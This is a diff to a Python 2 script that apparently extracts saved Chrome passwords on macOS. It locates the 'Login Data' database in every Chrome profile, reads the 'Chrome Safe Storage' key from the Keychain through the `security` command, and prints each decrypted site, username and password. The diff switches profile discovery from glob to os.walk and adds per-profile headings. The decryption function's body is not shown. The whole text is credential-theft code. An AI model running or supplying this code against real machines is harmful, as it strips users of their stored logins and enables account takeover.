@@ -1,8 +1,10 @@
-import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
- 
-loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
-if len(loginData) == 0:
-    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
+import sqlite3, os, binascii, subprocess, base64, sys, hashlib
+
+path = "%s/Library/Application Support/Google/Chrome/" % os.path.expanduser("~")
+loginData = []
+for x in os.walk(path).next()[1]:
+    if os.path.isfile("%s%s/Login Data" % (path, x)):
+        loginData.append("%s%s/Login Data" % (path, x))
 safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
 if safeStorageKey == "":
     print "ERROR getting Chrome Safe Storage Key"
@@ -36,4 +38,6 @@ def chromeProcess(safeStorageKey, loginData):
 
 for profile in loginData:
     for i, x in enumerate(chromeProcess(safeStorageKey, "%s" % profile)):
-    	print "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
+        if i == 0:
+            print "%sPasswords for Chrome Profile%s -> [%s%s%s]" % ("\033[92m", "\033[0m", "\033[95m", profile.split("/")[-2], "\033[0m")
+    	print "   %s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s" % ("\033[32m", (i + 1), "\033[0m", "\033[1m", x[0], "\033[0m", "\033[32m", "\033[0m", x[1], "\033[32m", "\033[0m", x[2])
